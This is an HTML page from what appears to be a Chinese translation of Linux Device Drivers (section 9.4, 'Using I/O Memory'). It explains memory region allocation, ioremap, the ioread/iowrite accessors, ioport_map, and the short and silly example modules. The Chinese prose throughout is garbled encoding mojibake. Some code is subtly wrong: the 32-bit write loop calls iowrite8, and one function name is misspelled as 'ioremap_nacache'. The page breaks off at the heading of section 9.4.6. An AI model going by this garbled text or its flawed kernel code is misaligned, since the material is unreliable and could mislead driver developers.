<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>9.4.&#160;Ê¹ÓÃ I/O ÄÚ´æ-LinuxÉè±¸Çı¶¯µÚÈı°æ£¨ÖĞÎÄ°æ£©- - </title>
<meta name="description" content="Çı¶¯¿ª·¢- - " />
<meta name="keywords" content="LinuxÉè±¸Çı¶¯,ÖĞÎÄ°æ,µÚÈı°æ,ldd,linux device driver,Çı¶¯¿ª·¢,µç×Ó°æ,³ÌĞòÉè¼Æ,Èí¼ş¿ª·¢, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux Éè±¸Çı¶¯ Edition 3">
<link rel="up" href="ch09.html" title="µÚ&#160;9&#160;ÕÂ&#160;ÓëÓ²¼şÍ¨Ñ¶">
<link rel="prev" href="ch09s03.html" title="9.3.&#160;Ò»¸ö I/O ¶Ë¿ÚÀı×Ó">
<link rel="next" href="ch09s05.html" title="9.5.&#160;¿ìËÙ²Î¿¼">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">9.4.&#160;Ê¹ÓÃ I/O ÄÚ´æ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch09s03.html">ÉÏÒ»Ò³</a>&#160;</td>
<th width="60%" align="center">µÚ&#160;9&#160;ÕÂ&#160;ÓëÓ²¼şÍ¨Ñ¶</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch09s05.html">ÏÂÒ»Ò³</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="UsingIOMemory.sect"></a>9.4.&#160;Ê¹ÓÃ I/O ÄÚ´æ</h2></div></div></div>
<p>¾¡¹Ü I/O ¶Ë¿ÚÔÚ x86 ÊÀ½çÖĞÁ÷ĞĞ, ÓÃÀ´ºÍÉè±¸Í¨Ñ¶µÄÖ÷Òª»úÖÆÊÇÍ¨¹ıÄÚ´æÓ³ÉäµÄ¼Ä´æÆ÷ºÍÉè±¸ÄÚ´æ. 2 Õß¶¼³ÆÎª I/O ÄÚ´æ, ÒòÎª¼Ä´æÆ÷ºÍÄÚ´æÖ®¼äµÄÇø±ğ¶ÔÈí¼şÊÇÍ¸Ã÷µÄ.</p>
<p>I/O ÄÚ´æÊÇ¼òµ¥µÄÒ»¸öÏó RAM µÄÇøÓò, Ëü±»´¦ÀíÆ÷ÓÃÀ´¿ç¹ı×ÜÏß´æÈ¡Éè±¸. Õâ¸öÄÚ´æ¿ÉÓÃ×÷¼¸¸öÄ¿µÄ, ÀıÈç³ÖÓĞÊÓÆµÊı¾İ»òÕßÒÔÌ«Íø±¨ÎÄ, Í¬Ê±ÊµÏÖÉè±¸¼Ä´æÆ÷¾ÍÏó I/O ¶Ë¿ÚÒ»ÑùµÄĞĞÎª(¼´, ËüÃÇÓĞ¶ÁºÍĞ´ËüÃÇÏà¹ØÁªµÄ±ß¼ÊĞ§¹û).</p>
<p>´æÈ¡ I/O ÄÚ´æµÄ·½Ê½ÒÀÀµ¼ÆËã»úÌåÏµ, ×ÜÏß, ºÍÊ¹ÓÃµÄÉè±¸, ¾¡¹ÜÍâÉèµ½´¦¶¼Ò»Ñù. ±¾ÕÂµÄÌÖÂÛÖ÷Òª´¥¼° ISA ºÍ PCI ÄÚ´æ, ¶øÒ²ÊÔÍ¼´«µİÍ¨ÓÃµÄĞÅÏ¢. ¾¡¹Ü´æÈ¡ PCI ÄÚ´æÔÚÕâÀï½éÉÜ, Ò»¸ö PCI µÄÍ¨Í¸½éÉÜ°²ÅÅÔÚµÚ 12 ÕÂ.</p>
<p>ÒÀÀµ¼ÆËã»úÆ½Ì¨ºÍÊ¹ÓÃµÄ×ÜÏß, I/O ÄÚ´æ¿ÉÒÔ»òÕß²»¿ÉÒÔÍ¨¹ıÒ³±íÀ´´æÈ¡. µ±Í¨¹ıÒ³±í´æÈ¡, ÄÚºË±ØĞëÊ×ÏÈ°²ÅÅ´ÓÄãµÄÇı¶¯¿É¼ûµÄÎïÀíµØÖ·, ²¢ÇÒÕâ³£³£ÒâÎ¶×ÅÄã±ØĞëµ÷ÓÃ ioremap ÔÚ×öÈÎºÎ I/O Ö®Ç°. Èç¹û²»ĞèÒªÒ³±í, I/O ÄÚ´æÎ»ÖÃ¿´À´ºÜÏó I/O ¶Ë¿Ú, ²¢ÇÒÄãÖ»¿ÉÒÔÊ¹ÓÃÕıÈ·µÄ°ü×°º¯Êı¶ÁºÍĞ´ËüÃÇ.</p>
<p>²»¹ÜÊÇ·ñĞèÒª ioremap À´´æÈ¡ I/O ÄÚ´æ, ²»¹ÄÀøÖ±½ÓÊ¹ÓÃ I/O ÄÚ´æµÄÖ¸Õë. ¾¡¹Ü(ÈçÍ¬ÔÚ "I/O ¶Ë¿ÚºÍ I/O ÄÚ´æ" Ò»½ÚÖĞ½éÉÜµÄ )I/O ÄÚ´æÈçÍ¬ÔÚÓ²¼ş¼¶±ğµÄÕı³£ RAM Ò»ÑùÑ°Ö·, ÔÚ"I/O ¼Ä´æÆ÷ºÍ´«Í³ÄÚ´æ"Ò»½ÚÖĞ¸ÅÊöµÄ¶îÍâµÄĞ¡ĞÄ½¨Òé±ÜÃâÕı³£µÄÖ¸Õë. ÓÃÀ´´æÈ¡ I/O ÄÚ´æµÄ°ü×°º¯ÊıÔÚËùÓĞÆ½Ì¨ÉÏÊÇ°²È«µÄ²¢ÇÒÔÚÈÎºÎÊ±ºòÖ±½ÓµÄÖ¸Õë½âÒıÓÃÄÜ¹»½øĞĞ²Ù×÷Ê±, »á±»ÓÅ»¯µô.</p>
<p>Òò´Ë, ¾¡¹ÜÔÚ x86 ÉÏ½âÒıÓÃÒ»¸öÖ¸ÕëÄÜ¹¤×÷(ÔÚÏÖÔÚ), ²»Ê¹ÓÃÕıÈ·µÄºê¶¨Òå×è°­ÁËÇı¶¯µÄÒÆÖ²ĞÔºÍ¿É¶ÁĞÔ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="IOMemoryAllocationandMapping.sect"></a>9.4.1.&#160;I/O ÄÚ´æ·ÖÅäºÍÓ³Éä</h3></div></div></div>
<p>I/O ÄÚ´æÇø±ØĞëÔÚÊ¹ÓÃÇ°·ÖÅä. ·ÖÅäÄÚ´æÇøµÄ½Ó¿ÚÊÇ( ÔÚ &lt;linux/ioport.h&gt; ¶¨Òå):</p>
<pre class="programlisting">
struct resource *request_mem_region(unsigned long start, unsigned long len, char *name);
</pre>
<p>Õâ¸öº¯Êı·ÖÅäÒ»¸ö len ×Ö½ÚµÄÄÚ´æÇø, ´Ó start ¿ªÊ¼. Èç¹ûÒ»ÇĞË³Àû, Ò»¸ö ·ÇNULL Ö¸Õë·µ»Ø; ·ñÔò·µ»ØÖµÊÇ NULL. ËùÓĞµÄ I/O ÄÚ´æ·ÖÅäÀ´ /proc/iomem ÖĞÁĞ³ö.</p>
<p>ÄÚ´æÇøÔÚ²»ÔÙĞèÒªÊ±Ó¦µ±ÊÍ·Å:</p>
<pre class="programlisting">
void release_mem_region(unsigned long start, unsigned long len); 
</pre>
<p>»¹ÓĞÒ»¸ö¾ÉµÄ¼ì²é I/O ÄÚ´æÇø¿ÉÓÃĞÔµÄº¯Êı:</p>
<pre class="programlisting">
int check_mem_region(unsigned long start, unsigned long len); 
</pre>
<p>µ«ÊÇ, ¶ÔÓÚ check_region, Õâ¸öº¯ÊıÊÇ²»°²È«ºÍÓ¦µ±±ÜÃâµÄ.</p>
<p>ÔÚ´æÈ¡ÄÚ´æÖ®Ç°, ·ÖÅä I/O ÄÚÇ¶²»ÊÇÎ¨Ò»µÄÒªÇóµÄ²½Öè. Äã±ØĞëÒ²±£Ö¤Õâ¸ö I/O ÄÚ´æÒÑ¾­¶ÔÄÚºËÊÇ¿É´æÈ¡µÄ. Ê¹ÓÃ I/O ÄÚ´æ²»Ö»ÊÇ½âÒıÓÃÒ»¸öÖ¸ÕëµÄÊÂÇé; ÔÚĞí¶àÏµÍ³, I/O ÄÚ´æ¸ù±¾²»ÊÇ¿ÉÒÔÕâÖÖ·½Ê½Ö±½Ó´æÈ¡µÄ. Òò´Ë±ØĞëÊ×ÏÈÉèÖÃÒ»¸öÓ³Éä. ÕâÊÇ ioremap º¯ÊıµÄ¹¦ÄÜ, ÔÚµÚ 1 ÕÂµÄ "vmalloc ¼°ÆäÓÑ"Ò»½ÚÖĞ½éÉÜµÄ. Õâ¸öº¯ÊıÉè¼ÆÀ´ÌØ±ğµÄ°²ÅÅĞéÄâµØÖ·¸ø I/O ÄÚ´æÇø.</p>
<p>Ò»µ©×°±¸ÁË ioremap (ºÍiounmap), Ò»¸öÉè±¸Çı¶¯¿ÉÒÔ´æÈ¡ÈÎºÎ I/O ÄÚ´æµØÖ·, ²»¹ÜÊÇ·ñËüÊÇÖ±½ÓÓ³Éäµ½ĞéÄâµØÖ·¿Õ¼ä. ¼Ç×¡, µ«ÊÇ, ´Ó ioremap ·µ»ØµÄµØÖ·²»Ó¦µ±Ö±½Ó½âÒıÓÃ; Ïà·´, Ó¦µ±Ê¹ÓÃÄÚºËÌá¹©µÄ´æÈ¡º¯Êı. ÔÚÎÒÃÇ½øÈëÕâĞ©º¯ÊıÖ®Ç°, ÎÒÃÇ×îºÃ»Ø¹ËÒ»ÏÂ ioremap Ô­ĞÍºÍ½éÉÜ¼¸¸öÎÒÃÇÔÚÇ°Ò»ÕÂÂÔ¹ıµÄÏ¸½Ú.</p>
<p>ÕâĞ©º¯Êı¸ù¾İÏÂÁĞ¶¨Òåµ÷ÓÃ:</p>
<pre class="programlisting">
#include &lt;asm/io.h&gt;
void *ioremap(unsigned long phys_addr, unsigned long size);
void *ioremap_nocache(unsigned long phys_addr, unsigned long size);
void iounmap(void * addr);
</pre>
<p>Ê×ÏÈ, Äã×¢ÒâĞÂº¯Êı ioremap_nacache. ÎÒÃÇÔÚµÚ 8 ÕÂÃ»ÓĞÉæ¼°Ëü, ÒòÎªËüµÄÒâË¼ÊÇÃ÷È·µØÓ²¼şÏà¹ØµÄ. ÒıÓÃ×ÔÒ»¸öÄÚºËÍ·ÎÄ¼ş:"It¡¯s useful if some control registers are in such an area, and write combining or read caching is not desirable.". Êµ¼ÊÉÏ, º¯ÊıÊµÏÖÔÚ´ó²¿·Ö¼ÆËã»úÆ½Ì¨ÉÏÓë ioremap Ò»ÖÂ: ÔÚËùÓĞ I/O ÄÚ´æÒÑ¾­Í¨¹ı·Ç»º³åµØÖ·¿É¼ûµÄµØ·½, Ã»ÓĞÀíÓÉÊ¹ÓÃÒ»¸ö·Ö¿ªµÄ, ·Ç»º³å ioremap °æ±¾.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AccessingIOMemory.sect"></a>9.4.2.&#160;´æÈ¡ I/O ÄÚ´æ</h3></div></div></div>
<p>ÔÚÒ»Ğ©Æ½Ì¨ÉÏ, Äã¿ÉÄÜÌÓ¹ı×÷ÎªÒ»¸öÖ¸ÕëÊ¹ÓÃ ioremap µÄ·µ»ØÖµµÄ³Í·£. ÕâÑùµÄÊ¹ÓÃ²»ÊÇ¿ÉÒÆÖ²µÄ, ²¢ÇÒ, ¸ü¼ÓµØ, ÄÚºË¿ª·¢ÕßÒÑ¾­Å¬Á¦À´Ïû³ıÈÎºÎÕâÑùµÄÊ¹ÓÃ. Ê¹ÓÃ I/O ÄÚ´æµÄÕıÈ··½Ê½ÊÇÍ¨¹ıÒ»ÏµÁĞÎª´Ë¶øÌá¹©µÄº¯Êı(Í¨¹ı &lt;asm/io.h&gt; ¶¨ÒåµÄ).</p>
<p>´Ó I/O ÄÚ´æ¶Á, Ê¹ÓÃÏÂÁĞÖ®Ò»:</p>
<pre class="programlisting">
unsigned int ioread8(void *addr);
unsigned int ioread16(void *addr);
unsigned int ioread32(void *addr);
</pre>
<p>ÕâÀï, addr Ó¦µ±ÊÇ´Ó ioremap »ñµÃµÄµØÖ·(Ò²ĞíÓëÒ»¸öÕûĞÍÆ«ÒÆ); ·µ»ØÖµÊÇ´Ó¸ø¶¨ I/O ÄÚ´æ¶ÁÈ¡µÄ.</p>
<p>ÓĞÀàËÆµÄÒ»ÏµÁĞº¯ÊıÀ´Ğ´ I/O ÄÚ´æ:</p>
<pre class="programlisting">
void iowrite8(u8 value, void *addr);
void iowrite16(u16 value, void *addr);
void iowrite32(u32 value, void *addr);
</pre>
<p>Èç¹ûÄã±ØĞë¶ÁºÍĞ´Ò»ÏµÁĞÖµµ½Ò»¸ö¸ø¶¨µÄ I/O ÄÚ´æµØÖ·, Äã¿ÉÒÔÊ¹ÓÃÕâĞ©º¯ÊıµÄÖØ¸´°æ±¾:</p>
<pre class="programlisting">
void ioread8_rep(void *addr, void *buf, unsigned long count);
void ioread16_rep(void *addr, void *buf, unsigned long count);

void ioread32_rep(void *addr, void *buf, unsigned long count);
void iowrite8_rep(void *addr, const void *buf, unsigned long count);
void iowrite16_rep(void *addr, const void *buf, unsigned long count);
void iowrite32_rep(void *addr, const void *buf, unsigned long count);
</pre>
<p>ÕâĞ©º¯Êı¶Á»òĞ´ count Öµ´Ó¸ø¶¨µÄ buf µ½ ¸ø¶¨µÄ addr. ×¢Òâ count ±í´ïÎªÔÚ±»Ğ´ÈëµÄÊı¾İ´óĞ¡; ioread32_rep ¶ÁÈ¡ count 32-Î»Öµ´Ó buf ¿ªÊ¼.</p>
<p>ÉÏÃæÃèÊöµÄº¯Êı½øĞĞËùÓĞµÄ I/O µ½¸ø¶¨µÄ addr. Èç¹û, Ïà·´, ÄãĞèÒª²Ù×÷Ò»¿é I/O µØÖ·, Äã¿ÉÊ¹ÓÃÏÂÁĞÖ®Ò»:</p>
<pre class="programlisting">
void memset_io(void *addr, u8 value, unsigned int count);
void memcpy_fromio(void *dest, void *source, unsigned int count);
void memcpy_toio(void *dest, void *source, unsigned int count);
</pre>
<p>ÕâĞ©º¯ÊıĞĞÎªÈçÍ¬ËüÃÇµÄ C ¿âÀàËÆÎï.</p>
<p>Èç¹ûÄãÍ¨ÀÀÄÚºËÔ´Âë, Äã¿É¿´µ½Ğí¶àµ÷ÓÃ¾ÉµÄÒ»Ì×º¯Êı, µ±Ê¹ÓÃ I/O ÄÚ´æÊ±. ÕâĞ©º¯ÊıÈÔÈ»¿ÉÒÔ¹¤×÷, µ«ÊÇËüÃÇÔÚĞÂ´úÂëÖĞµÄÊ¹ÓÃ²»¹ÄÀø. ³ıÁË±ğµÄÍâ, ËüÃÇ½ÏÉÙ°²È«ÒòÎªËüÃÇ²»½øĞĞÍ¬ÑùµÄÀàĞÍ¼ì²é. µ«ÊÇ, ÎÒÃÇÔÚÕâÀïÃèÊöËüÃÇ:</p>
<pre class="programlisting">
unsigned readb(address);
unsigned readw(address);
unsigned readl(address); 
</pre>
<p>ÕâĞ©ºê¶¨ÒåÓÃÀ´´Ó I/O ÄÚ´æ»ñÈ¡ 8-Î», 16-Î», ºÍ 32-Î» Êı¾İÖµ.</p>
<pre class="programlisting">
void writeb(unsigned value, address);
void writew(unsigned value, address);
void writel(unsigned value, address); 
</pre>
<p>ÈçÍ¬Ç°ÃæµÄº¯Êı, ÕâĞ©º¯Êı(ºê)ÓÃÀ´Ğ´ 8-Î», 16-Î», ºÍ 32-Î»Êı¾İÏî.</p>
<p>Ò»Ğ© 64-Î»Æ½Ì¨Ò²Ìá¹© readq ºÍ writeq, Îª PCI ×ÜÏßÉÏµÄ 4-×Ö(8-×Ö½Ú)ÄÚ´æ²Ù×÷. Õâ¸ö 4-×Ö µÄÃüÃûÊÇÒ»¸ö´ÓËùÓĞµÄÕæÊµ´¦ÀíÆ÷ÓĞ 16-Î» ×ÖµÄÊ±ºòµÄÀúÊ·ÒÅÁô. Êµ¼ÊÉÏ, ÓÃ×÷ 32-Î» ÖµµÄ L ÃüÃûÒ²ÒÑ±äµÃ²»ÕıÈ·, µ«ÊÇÃüÃûÈÎºÎ¶«Î÷¿ÉÄÜÊ¹ÊÂÇé¸ü»ìÏı.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PortsasIOMemory.sect"></a>9.4.3.&#160;×÷Îª I/O ÄÚ´æµÄ¶Ë¿Ú</h3></div></div></div>
<p>Ò»Ğ©Ó²¼şÓĞÒ»¸öÓĞÈ¤µÄÌØĞÔ: Ò»Ğ©°æ±¾Ê¹ÓÃ I/O ¶Ë¿Ú, ¶øÆäËûµÄÊ¹ÓÃ I/O ÄÚ´æ. Êä³ö¸ø´¦ÀíÆ÷µÄ¼Ä´æÆ÷ÔÚÈÎÒ»ÖÖÇé¿öÖĞÏàÍ¬, µ«ÊÇ´æÈ¡·½·¨ÊÇ²»Í¬µÄ. ×÷ÎªÒ»¸öÊ¹Çı¶¯´¦ÀíÕâÀàÓ²¼şµÄÉú»îÈİÒ×Ğ©µÄ·½Ê½, ²¢ÇÒ×÷ÎªÒ»¸öÊ¹ I/O ¶Ë¿ÚºÍÄÚ´æ´æÈ¡µÄÇø±ğ×îĞ¡»¯µÄ·½·¨, 2.6 ÄÚºËÌá¹©ÁËÒ»¸öº¯Êı, ³ÆÎª ioport_map:</p>
<pre class="programlisting">
void *ioport_map(unsigned long port, unsigned int count); 
</pre>
<p>Õâ¸öº¯ÊıÖØÓ³Éä count I/O ¶Ë¿ÚºÍÊ¹ËüÃÇ³öÏÖÎª I/O ÄÚ´æ. ´ÓÕâµãÒÔºó, Çı¶¯¿ÉÒÔÔÚ·µ»ØµÄµØÖ·ÉÏÊ¹ÓÃ ioread8 ºÍÆäÓÑ²¢ÇÒ¸ù±¾Íü¼ÇËüÔÚÊ¹ÓÃ I/O ¶Ë¿Ú.</p>
<p>Õâ¸öÓ³ÉäÓ¦µ±ÔÚËü²»ÔÙ±»Ê¹ÓÃÊ±»Ö¸´:</p>
<pre class="programlisting">
void ioport_unmap(void *addr); 
</pre>
<p>ÕâĞ©º¯ÊıÊ¹ I/O ¶Ë¿Ú¿´À´ÏóÄÚ´æ. µ«ÊÇ, ×¢Òâ I/O ¶Ë¿Ú±ØĞëÈÔÈ»Ê¹ÓÃ request_region ÔÚËüÃÇÒÔÕâÖÖ·½Ê½±»ÖØÓ³ÉäÇ°·ÖÅä.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ReusingshortforIOMemory.sect"></a>9.4.4.&#160;ÖØÓÃ short Îª I/O ÄÚ´æ</h3></div></div></div>
<p>short Àı×ÓÄ£¿é, ÔÚ´æÈ¡ I/O ¶Ë¿ÚÇ°½éÉÜµÄ, Ò²ÄÜÓÃÀ´´æÈ¡ I/O ÄÚ´æ. Îª´Ë, Äã±ØĞë¸æËßËüÊ¹ÓÃ I/O ÄÚ´æÔÚ¼ÓÔØÊ±; »¹ÓĞ, ÄãĞèÒª¸Ä±ä»ùµØÖ·À´Ê¹ËüÖ¸ÏòÄãµÄ I/O Çø.</p>
<p>ÀıÈç, ÕâÊÇÎÒÃÇÈçºÎÊ¹ÓÃ short À´µãÁÁµ÷ÊÔ LED, ÔÚÒ»¸ö MIPS ¿ª·¢°åÉÏ:</p>
<pre class="screen">
mips.root# ./short_load use_mem=1 base=0xb7ffffc0
mips.root# echo -n 7 &gt; /dev/short0
</pre>
<p>Ê¹ÓÃ short ¸ø I/O ÄÚ´æÊÇÓëËüÓÃÔÚ I/O ¶Ë¿ÚÉÏÍ¬ÑùµÄ.</p>
<p>ÏÂÁĞÆ¬¶ÎÏÔÊ¾ÁË short ÔÚĞ´ÈëÒ»¸öÄÚ´æÎ»ÖÃÊ±ÓÃµÄÑ­»·:</p>
<pre class="programlisting">
while (count--) {
 iowrite8(*ptr++, address);
    wmb(); 
} 
</pre>
<p>×¢Òâ, ÕâÀïÊ¹ÓÃÒ»¸öĞ´ÄÚ´æÆÁÕÏ. ÒòÎªÔÚºÜ¶àÌåÏµÉÏ iowrites8 ¿ÉÄÜ×ª±äÎªÒ»¸öÖ±½Ó¸³Öµ, ĞèÒªÄÚ´æÆÁÕÏÀ´±£Ö¤ÒÔÏ£ÍûµÄË³ĞòÀ´·¢Éú.</p>
<p>short Ê¹ÓÃ inb ºÍ outb À´ÏÔÊ¾ËüÈçºÎÍê³É. ¶ÔÓÚ¶ÁÕßËü¿ÉÄÜÊÇÒ»¸öÖ±½ÓµÄÁ·Ï°, µ«ÊÇ, ¸Ä±ä short À´Ê¹ÓÃ ioport_map ÖØÓ³Éä I/O ¶Ë¿Ú, ²¢ÇÒÏàµ±µØ¼ò»¯Ê£ÏÂµÄ´úÂë.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ISAMemoryBelow1MB.sect"></a>9.4.5.&#160;ÔÚ 1 MB Ö®ÏÂµÄ ISA ÄÚ´æ</h3></div></div></div>
<p>Ò»¸ö×îÖøÃûµÄ I/O ÄÚ´æÇøÊÇÔÚ¸öÈË¼ÆËã»úÉÏµÄ ISA ·¶Î§. ÕâÊÇÔÚ 640 KB(0xA0000)ºÍ 1 MB(0x100000)Ö®¼äµÄÄÚ´æ·¶Î§. Òò´Ë, ËüÕıºÃ³öÏÖÓÚ³£¹æÄÚ´æ RAM ÖĞ¼ä. Õâ¸öÎ»ÖÃ¿ÉÄÜ¿´ÆğÀ´ÓĞµãÆæ¹Ö; ËüÊÇÒ»¸öÔÚ 1980 Äê´úÔçÆÚËù×÷µÄ¾ö¶¨µÄ²úÎï, µ±Ê± 640 KB ÄÚ´æ¿´À´¶àÓÚÈÎºÎÈË¿ÉÄÜÓÃµ½µÄ´óĞ¡.</p>
<p>Õâ¸öÄÚ´æ·½·¨ÊôÓÚ·ÇÖ±½ÓÓ³ÉäµÄÄÚ´æÀà±ğ. <sup>[<a name="id457608" href="#ftn.id457608">36</a>]</sup>Äã¿ÉÒÔ¶Á/Ğ´¼¸¸ö×Ö½ÚÔÚÕâ¸öÄÚ´æ·¶Î§, ÈçÍ¬Ç°Ãæ½âÊÍµÄÊ¹ÓÃ short Ä£¿é, ¾ÍÊÇ, Í¨¹ıÔÚ¼ÓÔØÊ±ÉèÖÃ use_mem.</p>
<p>¾¡¹Ü ISA I/O ÄÚ´æÖ»ÔÚ x86-Àà ¼ÆËã»úÖĞ´æÔÚ, ÎÒÃÇÈÏÎªÖµµÃÓÃ¼¸¾ä»°ºÍÒ»¸öÀı×ÓÇı¶¯.</p>
<p>ÎÒÃÇ²»»áÌ¸ÂÛ PCI ÔÚ±¾ÕÂ, ÒòÎªËüÊÇ×î¸É¾»µÄÒ»Àà I/O ÄÚ´æ: Ò»µ©ÄãÖªµÀÄÚ´æµØÖ·, Äã¿É¼òµ¥µØÖØÓ³ÉäºÍ´æÈ¡Ëü. PCI I/O ÄÚ´æµÄ"ÎÊÌâ"ÊÇËü²»ÄÜÎª±¾ÕÂÌá¹©Ò»¸öÄÜ¹¤×÷µÄÀı×Ó, ÒòÎªÎÒÃÇ²»ÄÜÊÂÏÈÖªµÀÄãµÄ PCI ÄÚ´æÓ³Éäµ½µÄÎïÀíµØÖ·, »òÕßÊÇ·ñËüÊÇ°²È«µÄÀ´´æÈ¡ÈÎÒ»ÕâĞ©·¶Î§. ÎÒÃÇÑ¡ÔñÀ´ÃèÊö ISA ÄÚ´æ·¶Î§, ÒòÎªËü²»µ«ÉÙ¸É¾»²¢ÇÒ¸üÊÊºÏÔËĞĞÀı×Ó´úÂë.</p>
<p>ÎªÑİÊ¾´æÈ¡ ISA ÄÚ´æ, ÎÒÃÇ»¹Ê¹ÓÃÁíÒ»¸ö silly Ğ¡Ä£¿é( Àı×ÓÔ´ÂëµÄÒ»²¿·Ö). Êµ¼ÊÉÏ, Õâ¸ö³ÆÎª silly, ×÷Îª Simple Tool for Unloading and Printing ISA Data µÄËõĞ´, »òÕßÈç´ËµÄ¶«¶«.</p>
<p>Ä£¿é²¹³äÁË short µÄ¹¦ÄÜ, Í¨¹ı´æÈ¡Õû¸ö 384-KB ÄÚ´æ¿Õ¼äºÍÍ¨¹ıÏÔÊ¾ËùÓĞµÄ²»Í¬ I/O ¹¦ÄÜ. ËüÌØÓĞ 4 ¸öÉè±¸½ÚµãÀ´½øĞĞÍ¬ÑùµÄÈÎÎñ, Ê¹ÓÃ²»Í¬µÄÊı¾İ´«Êäº¯Êı. silly Éè±¸×÷ÎªÒ»¸ö I/O ÄÚ´æÉÏµÄ´°¿Ú, ÒÔÀàËÆ /dev/mem µÄ·½Ê½. Äã¿ÉÒÔ¶ÁºÍĞ´Êı¾İ, ²¢ÇÒlseek µ½Ò»¸öÈÎÒâ I/O ÄÚ´æµØÖ·.</p>
<p>ÒòÎª silly Ìá¹©ÁË¶Ô ISA ÄÚ´æµÄ´æÈ¡, Ëü±ØĞë¿ªÊ¼ÓÚ´ÓÓ³ÉäÎïÀí ISA µØÖ·µ½ÄÚºËĞéÄâµØÖ·. ÔÚ Linux ÄÚºËµÄÔçÆÚ, Ò»¸öÈË¿ÉÒÔ¼òµ¥µØ°²ÅÅÒ»¸öÖ¸Õë¸øÒ»¸ö¸ĞĞËÈ¤µÄ ISA µØÖ·, ½Ó×ÅÖ±½Ó¶ÔËü½âÒıÓÃ. ÔÚÏÖ´úÊÀ½ç, µ«ÊÇ, ÎÒÃÇ±ØĞëÊ×ÏÈÊ¹ÓÃĞéÄâÄÚ´æÏµÍ³ºÍÖØÓ³ÉäÄÚ´æ·¶Î§. Õâ¸öÓ³ÉäÊ¹ÓÃ ioremap Íê³É, ÈçÍ¬Ç°ÃæÎª short ½âÊÍµÄ:</p>
<pre class="programlisting">
#define ISA_BASE 0xA0000
#define ISA_MAX 0x100000 /* for general memory access */

/* this line appears in silly_init */
io_base = ioremap(ISA_BASE, ISA_MAX - ISA_BASE); 
</pre>
<p>ioremap ·µ»ØÒ»¸öÖ¸ÕëÖµ, ËüÄÜ±»ÓÃÀ´Ê¹ÓÃ ioread8 ºÍÆäËûº¯Êı, ÔÚ"´æÈ¡ I/O ÄÚ´æ"Ò»½ÚÖĞ½âÊÍ.</p>
<p>ÈÃÎÒÃÇ»Ø¹ËÎÒÃÇµÄÀı×ÓÄ£¿éÀ´¿´¿´ÕâĞ©º¯ÊıÈçºÎ±»Ê¹ÓÃ. /dev/sillyb, ÌØÓĞ´Î±àºÅ 0, ´æÈ¡ I/O ÄÚ´æÊ¹ÓÃ ioread8 ºÍ iowrite8. ÏÂÁĞ´úÂëÏÔÊ¾ÁË¶ÁµÄÊµÏÖ, ËüÊ¹µØÖ··¶Î§ 0xA0000-0xFFFF ×÷ÎªÒ»¸öĞéÄâÎÄ¼şÔÚ·¶Î§ 0-0x5FFF. ¶Áº¯Êı¹¹ÔìÎªÒ»¸ö switch Óï¾äÔÚ²»Í¬´æÈ¡Ä£Ê½ÉÏ; ÕâÊÇ sillyb Àı×Ó:</p>
<pre class="programlisting">
case M_8:
 while (count) {
 *ptr = ioread8(add);
 add++;
 count--;
 ptr++;

 }
 break;
</pre>
<p>Êµ¼ÊÉÏ, Õâ²»ÊÇÍêÈ«ÕıÈ·. ÄÚ´æ·¶Î§ÊÇºÜĞ¡ºÍºÜÆµ·±µÄÊ¹ÓÃ, ÒÔÖÁÓÚÄÚºËÔÚÆô¶¯Ê±½¨Á¢Ò³±íÀ´´æÈ¡ÕâĞ©µØÖ·. µ«ÊÇ, Õâ¸öÓÃÀ´´æÈ¡ËüÃÇµÄĞéÄâµØÖ·²»ÊÇÍ¬Ò»¸öÎïÀíµØÖ·, ²¢ÇÒÒò´ËÎŞÂÛÈçºÎĞèÒª ioremap.</p>
<p>ÏÂ 2 ¸öÉè±¸ÊÇ /dev/sillyw (´Î±àºÅ 1) ºÍ /dev/silly1 (´Î±àºÅ 2). ËüÃÇ±íÏÖÏó /dev/sillyb, ³ıÁËËüÃÇÊ¹ÓÃ 16-Î» ºÍ 32-Î» º¯Êı. ÕâÊÇ sillyl µÄĞ´ÊµÏÖ, ÓÖÒ»´Î²¿·Ö switch:</p>
<pre class="programlisting">
case M_32:
 while (count &gt;= 4) {
 iowrite8(*(u32 *)ptr, add);
 add += 4;
 count -= 4;
 ptr += 4;

 }
 break;
</pre>
<p>×îºóµÄÉè±¸ÊÇ /dev/sillycp (´Î±àºÅ 3), ËüÊ¹ÓÃ memcpy_*io º¯ÊıÀ´½øĞĞÍ¬ÑùµÄÈÎÎñ. ÕâÊÇËüµÄ¶ÁÊµÏÖµÄºËĞÄ:</p>
<pre class="programlisting">
case M_memcpy:
 memcpy_fromio(ptr, add, count);
 break;
</pre>
<p>ÒòÎª ioremap ÓÃÀ´Ìá¹©¶Ô ISA ÄÚ´æÇøµÄ´æÈ¡, silly ±ØĞëµ÷ÓÃ iounmap µ±Ä£¿éĞ¶ÔØÊ±:</p>
<pre class="programlisting">
iounmap(io_base); 
</pre>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="isareadbandFriends.sect"></a>9.4.6.&#160;isa_readb ºÍÆäÓÑ</h3></div></div></div>
